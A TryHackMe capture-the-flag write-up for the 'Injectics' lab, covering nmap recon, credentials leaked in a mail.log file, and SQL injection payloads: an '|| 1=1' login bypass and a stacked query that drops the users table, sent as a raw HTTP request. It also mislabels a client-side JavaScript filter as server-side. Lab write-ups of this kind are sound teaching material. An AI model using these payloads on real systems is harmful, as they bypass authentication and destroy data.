TRYHACKME Injectics Room Write Up

This exercise demonstrates how I leveraged various injection techniques to exploit and take control of a web application

**Reconnaissance**

```
nmap -sC -sV $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-19 10:01 BST
Nmap scan report for 10.10.208.27
Host is up (0.050s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 22:6e:52:07:d4:40:75:9a:2d:6c:ba:19:3a:99:81:df (RSA)
|   256 3a:1a:95:bd:ae:af:4b:9c:40:cd:db:46:4a:d0:93:48 (ECDSA)
|_  256 b7:79:d1:6d:07:50:e5:6d:1d:66:25:61:fd:41:a1:aa (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Injectics Leaderboard
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.54 seconds

```

After browsing the website at hosted on port 80.

I found the a loging page located at:
  - injectics.thm/login.php
  - injectics.thm/adminLogin007.php

Viewing the page source, I noticed the following comentary:

```
<!-- Mails are stored in mail.log file-->
    <!-- Bootstrap JS and dependencies -->
    <script src="/js/slim.min.js"></script>
    <script src="/js/popper.min.js"></script>
    <script src="/js/bootstrap.min.js"></script>
</body>
</html>
```
While inspecting the /mail.log page, I uncovered two sets of credentials:

```
( ... )


| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |

( ... )

```
Additionally, I came across the following message:

    "To enhance security, I have configured the service to automatically restore default credentials into the users table if it is ever deleted or corrupted. 
     This guarantees continued access for performing system maintenance. The service is set to run every minute."

This suggests that if the users table is removed, the system will reinstate the default credentials, giving me a reliable way to regain access to the admin panel.

The next step is to inject SQL payloads to bypass the login and gain access, followed by deleting the users table. 
Once the table is deleted, use the restored default credentials to log in as an admin.


**SQL Injection**

By analyzing the page source for the login page, I found a java script file at http://injectics.thm/script.js the contained the following code:

```
	const invalidKeywords = ['or', 'and', 'union', 'select', '"', "'"];
            for (let keyword of invalidKeywords) {
                if (username.includes(keyword)) {
                    alert('Invalid keywords detected');
                   return false;
                }
            }
```
This is a server-side validation mechanism intended to prevent SQL injection attacks by filtering out potentially 
harmful keywords that could be used to manipulate SQL queries.

While this approach adds a basic layer of security, it has some limitations.

Understanding this is important because it enables me to identify potential bypass techniques using alternative payloads that are not covered by the existing checks.

Using burpsuite I injected the following sql code and successfully logged in:

```
username=123' || 1=1 -- -&password=123&function=login
```

Next, I need to delete the users table

To do this I need to send the following http post request into http://injectics.thm/edit_leaderboard.php?rank=1&country=USA

```
POST /edit_leaderboard.php HTTP/1.1
Host: 10.10.71.179
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Origin: http://10.10.71.179
Connection: keep-alive
Referer: http://10.10.71.179/edit_leaderboard.php?rank=1&country=USA
Cookie: PHPSESSID=vncem6svp5unp2bpkpn94t1buc
Upgrade-Insecure-Requests: 1

rank=1&country=&gold=22; drop table users -- -&silver=21&bronze=12345
```

I got the following message

'Seems like database or some important table is deleted. InjecticsService is running to restore it. Please wait for 1-2 minutes.'
















